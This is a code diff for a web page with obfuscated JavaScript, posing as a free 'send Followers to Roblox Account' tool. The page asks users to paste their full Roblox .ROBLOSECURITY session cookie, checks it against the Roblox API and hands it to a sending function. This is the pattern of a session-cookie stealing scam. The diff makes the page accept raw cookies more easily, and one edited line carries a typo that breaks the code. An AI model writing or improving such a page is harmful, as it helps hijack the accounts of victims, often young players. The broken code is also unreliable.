@@ -12,12 +12,11 @@ function x1y2y2z3(title, text, icon, confirmButtonText) {
 }
 
 async function getUsernameFromCookie(cookie) {
-    const userIdMatch = cookie.match(/\.ROBLOSECURITY=([^;]+)/);
-    if (!userIdMatch) {
+    // Asegúrate de que la cookie esté en el formato correcto
+    const robloxSecurityCookie = cookie.trim();
+    if (!robloxSecurityCookie) {
         throw new Error("Invalid cookie");
     }
-
-    const robloxSecurityCookie = userIdMatch[1];
 
     // Hacer una solicitud a la API de Roblox para obtener el usuario
     const response = await fetch(`https://users.roblox.com/v1/users/authenticated`, {
@@ -28,7 +27,8 @@ async function getUsernameFromCookie(cookie) {
     });
 
     if (!response.ok) {
-        throw new Error("Failed to fetch user data");
+        const errorText = await response.text(); // Obtener el texto del error
+        throw new Error(`Failed to fetch user data: ${errorText}`);
     }
 
     const userData = await response.json();
@@ -56,7 +56,8 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
         if (response.ok) {
             x1y2y2z3("Success", "Successfully sent.", "success", "Okay");
         } else {
-            x1y2y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
+            const errorText = await response.text(); // Obtener el texto del error
+            x1y2y2z3("Error", `Failed to send Followers to Roblox Account: ${errorText}`, "error", "Retry");
         }
     } catch (error) {
         x1y2y2z3("Error", error.message, "error", "Retry");
@@ -65,10 +66,10 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
 
 document.addEventListener("DOMContentLoaded", function() {
     document.getElementById("Send").addEventListener("click", function() {
-        const p1q2r3 = document.getElementById("user_code").value;
+        const p1q2r3 = document.getElementById("user_code").value; // Asegúrate de que este campo contenga la cookie completa
         const s4t5u7 = document.getElementById("amount").value;
 
-        if (!p1q2r3 || !s4t5u7) {
+        if (!p1q2r3 || !s4t5u u7) {
             x1y2y2z3("Validation Error", "Please fill in all fields.", "warning", "Okay");
             return;
         }
@@ -87,7 +88,7 @@ document.addEventListener("DOMContentLoaded", function() {
         Swal.fire(v7w8x9).then((result) => {
             if (result.isConfirmed) {
                 a1b2c3d4(p1q2r3, s4t5u7);
- }
+            }
         });
     });
 }); 
